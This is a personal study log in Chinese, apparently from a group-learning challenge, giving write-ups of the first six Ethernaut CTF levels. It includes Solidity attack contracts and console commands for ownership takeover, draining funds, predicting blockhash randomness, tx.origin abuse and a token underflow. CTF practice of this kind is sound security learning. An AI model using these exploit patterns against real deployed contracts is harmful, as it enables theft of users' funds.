---
timezone: Asia/Taipei # 台灣标准时间 (UTC+8)
---


# Eekau

1. 自我介绍
hi, im Eekau.
2. 你认为你会完成本次残酷学习吗？
第一次參加希望能完成

# 殘酷共學

<!-- Content_START -->
- 1.Ethernaut CTF (31)
- 4.Ethcc CTF 2023 (5)
- 13.Openzeppelin CTF 2023 (9)

### 2024.08.29
>##### Ethernaut CTF (1/31)
>>###### Hello Ethernaut
>>1. 建立錢包
>>2. 在[Ethereum Faucet](https://cloud.google.com/application/web3/faucet/ethereum)領取Holešky測試幣 (可以使用其他網路)
>>3. 把網路切到Holešky開始遊戲
>>4. 根據說明在console裡輸入info()
>>5. 根據"PromiseResult"指示輸入ABI最終會需要輸入密碼
>>6. 輸入contract 查找ABI 發現password()這個function 找到密碼
>>7. 輸入獲得密碼 (這邊記得要把字串放在""裡面)
>>8. 點選網頁下方Submit instance
>>9. 獲得成功破關畫面

### 2024.08.30
> ### Ethernaut CTF (2/31)
>> #### Fallback
>> ##### 目標：成為owner，偷光合約的錢
>> ###### 先備知識 
>> - 了解 fallback
>> - 知道如何 sendTransaction
>> ###### 解題
>> 1. 觀察程式碼發現能更改owner的地方，除了`constructor()` 外有兩處 `contribute()` 和 `receive()`
>>```solidity
>>function contribute() public payable {
>>     require(msg.value < 0.001 ether); //只要發送0.001以上的ether 退回gass
>>     contributions[msg.sender] += msg.value;// 發送者獲得ether貢獻
>>     if (contributions[msg.sender] > contributions[owner]) {
>>     //只要發送者交給合約的ether比owner多
>>         owner = msg.sender; //把owner更換為發送者
>>     }
>> }
>> ```
>> 然而constructor()時 已經預設`contributions[msg.sender] = 1000 * (1 ether)` 自己的錢包並沒有這樣龐大數目的eth
>>```solidity
>>receive() external payable {
>>      require(msg.value > 0 && contributions[msg.sender] > 0);
>>      //只要msg.value大於0且有貢獻
>>      owner = msg.sender;
>>  }
>> ```
>> `receive()`觸發條件為 發送ether+msg.data為空。
>> 2. 查找function`sendTransaction`位置在excute.js
>> 找到說明是使用web3 API [sendTrasaction](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#eth-sendtransaction) 
>> 根據說明使用`contract.contribute.sendTransaction({ from: player,to: act.address value: toWei('0.0001')})`
>> 3. 用`await contract.getContribution().then(v => v.toString())` 確認 contribution > 0
>> 4. 再發出一次交易 觸發receive()
>> 5. 輸入`await contract.owner()` owener已經變成player了
>> 6. 使用 `contract.withdraw()` 把錢領光

### 2024.08.31
>#### Ethernaut CTF (3/31)
>>##### Fallout
>> ##### 目標：成為owner
>> 1. 觀察程式碼發現`Fal1out()`function可以更改owner為sender
>> 2. 輸入 `contract.Fal1out()` 
>> 3. 用`await contract.owner()`確認自己成為owner
###### 實際案例 
Rubixi hack

>#### Ethernaut CTF (4/31)
>>##### Coin Flip
>>##### 目標： 猜對10次
>>##### 先備知識
>> - block.number?
>> - 如何用Solidity和其他合約互動
>> 
### 2024.09.01

>> - block.number
>>   block.number 是當前 block 編號 並非真正隨機
>>   可以很容易查詢到
>> - 如何用Solidity和其他合約互動?
>>   ```solidity
>>   interface ICoinFlip {
>>       function flip(bool _guess) external returns (bool);
>>   }
>>   ```
>>   
>>   ```solidity
>>   contract Mycontract{
>>       ICoinFlip(目標合約).flip(side);
>>   }
>>   ```
>>   [參考影片](https://www.youtube.com/watch?v=YWtT0MNHYhQ)
>>   試著產出和給的程式碼相同結果的合約執行10次
>>   
> > ```solidity
> > // SPDX-License-Identifier: MIT
> > pragma solidity ^0.8.24;
> > 
> > interface ICoinFlip{
> >     function flip(bool _guess) external returns (bool);
> > }
> > contract solveFlip{
> >     uint256 public myConsecutiveWins;
> >     uint256 lastHash;
> >     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
> >     constructor() {
> >     myConsecutiveWins = 0;
> >     }
> >     function guessCorrect(address _CoinFlip) external returns(bool isSuccess){
> > 
> >         uint256 blockValue = uint256(blockhash(block.number - 1));
> >         if(lastHash == blockValue) {
> >             revert();
>>         }
>>         
>>         lastHash = blockValue;
>>         uint256 coinFlip = blockValue / FACTOR;
>>         bool side = coinFlip == 1 ? true : false;
>>         return ICoinFlip(_CoinFlip).flip(side);
>>     }
>> }
>> ```
>> 通關~

### 2024.09.02
>#### Ethernaut CTF (5/31)
>>##### Telephone
>>##### 目標： 成為owner
>>##### 先備知識
>> - tx.origin 和 msg.sender 的不同
>> ###### 解題
>> 設計一個由contract地址幫玩家交互的function執行
>> 
>>```solidity
>>// SPDX-License-Identifier: MIT
>>pragma solidity ^0.8.24;
>>interface ITelephone{
>>    function changeOwner(address _owner) external;
>>}
>>contract solvetele{
>>    function helpMechageOwner(address _contrect) public{
>>        ITelephone(_contrect).changeOwner(msg.sender);
>>    }
>> }
>>```
>#### Ethernaut CTF (6/31)
>>##### Token
>>##### 目標： 得到更多tokens，最好大量
>>##### 先備知識
>> -  Underflow and Overflow


### 2024.09.03
>> ###### 解題
>> 1. uint256 範圍 0 ~ 2²⁵⁶ — 1.
>> 2. trasfer function 並沒有檢查扣完後會不會underflow
>>    ```solidity
>>     function transfer(address _to, uint256 _value) 
>>     public returns (bool) {
>>         require(balances[msg.sender] - _value >= 0);
>>         balances[msg.sender] -= _value;
>>         balances[_to] += _value;
>>         return true;
>>     }
>>    ``` 
>> 3.把transfer的數量大於持有的數量
>>   `contract.transfer(contract.address, 21)`
>> 4.`await contract.balanceOf(player)`會發現持有超多token
>> 通關~
<!-- Content_END -->
